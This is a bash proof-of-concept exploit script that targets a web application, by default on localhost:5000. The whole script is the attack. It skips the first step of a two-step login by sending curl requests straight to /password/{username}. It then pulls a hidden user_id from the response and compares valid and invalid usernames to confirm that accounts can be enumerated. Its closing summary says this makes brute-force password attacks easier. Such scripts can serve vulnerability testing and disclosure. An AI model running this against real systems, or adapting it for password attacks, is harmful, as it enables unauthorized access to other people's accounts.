#!/bin/bash

# POC: Two-Step Authentication Bypass via Direct URL Access
# This demonstrates bypassing step 1 of authentication by directly accessing /password/{username}

TARGET_URL="${TARGET_URL:-http://localhost:5000}"
VALID_USERNAME="test"
INVALID_USERNAME="nonexistent_user_xyz"

echo "=========================================="
echo "Two-Step Authentication Bypass POC"
echo "=========================================="
echo ""

echo "[*] Target: $TARGET_URL"
echo ""

echo "=== NORMAL FLOW (for comparison) ==="
echo "[1] Step 1: POST username to /"
STEP1_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$VALID_USERNAME" \
  -c /tmp/cookies_normal.txt)

echo "$STEP1_RESPONSE" | head -20
echo ""

REDIRECT_LOCATION=$(echo "$STEP1_RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
echo "[*] Step 1 redirects to: $REDIRECT_LOCATION"
echo ""

echo "=== BYPASS: Direct Access to Step 2 ==="
echo "[2] Attempting direct GET to /password/$VALID_USERNAME (bypassing step 1)"
echo ""

BYPASS_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/password/$VALID_USERNAME")

HTTP_STATUS=$(echo "$BYPASS_RESPONSE" | grep "^HTTP" | awk '{print $2}')
echo "[*] HTTP Status Code: $HTTP_STATUS"
echo ""

if [ "$HTTP_STATUS" = "200" ]; then
    echo "[+] SUCCESS: Direct access allowed! Application served step 2 without completing step 1"
    echo ""
    
    # Extract key indicators from response
    if echo "$BYPASS_RESPONSE" | grep -q "Welcome"; then
        WELCOME_MSG=$(echo "$BYPASS_RESPONSE" | grep -o "Welcome[^<]*" | head -1)
        echo "[+] Found welcome message: '$WELCOME_MSG'"
    fi
    
    if echo "$BYPASS_RESPONSE" | grep -q 'type="password"'; then
        echo "[+] Password input field present in response"
    fi
    
    if echo "$BYPASS_RESPONSE" | grep -q "user_id"; then
        USER_ID=$(echo "$BYPASS_RESPONSE" | grep -o 'name="user_id" value="[^"]*"' | cut -d'"' -f4)
        echo "[+] Hidden user_id field found: $USER_ID"
    fi
    
    if echo "$BYPASS_RESPONSE" | grep -q 'name="username"'; then
        echo "[+] Username field present in form"
    fi
    
    echo ""
    echo "[!] VULNERABILITY CONFIRMED: Authentication flow can be bypassed"
    echo "[!] Attacker can skip step 1 and directly access step 2 for any valid username"
else
    echo "[-] Direct access returned HTTP $HTTP_STATUS (not 200)"
    echo "[*] Flow control may be properly implemented"
fi

echo ""
echo "=== VERIFICATION: Testing with invalid username ==="
echo "[3] Attempting direct GET to /password/$INVALID_USERNAME"
echo ""

INVALID_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/password/$INVALID_USERNAME")
INVALID_STATUS=$(echo "$INVALID_RESPONSE" | grep "^HTTP" | awk '{print $2}')

echo "[*] HTTP Status Code for invalid username: $INVALID_STATUS"

if [ "$INVALID_STATUS" = "302" ]; then
    INVALID_LOCATION=$(echo "$INVALID_RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
    echo "[*] Redirects to: $INVALID_LOCATION"
    echo "[+] Application correctly rejects invalid usernames"
    echo "[!] This confirms the endpoint validates usernames, making the bypass exploitable for enumeration"
fi

echo ""
echo "=== IMPACT SUMMARY ==="
echo "1. Attackers can bypass step 1 authentication checks"
echo "2. Multi-step flow control is not enforced"
echo "3. Combined with username enumeration, enables direct password attacks"
echo "4. Simplifies automation of brute force attacks"
echo "5. May evade security controls monitoring only step 1"
echo ""
echo "=========================================="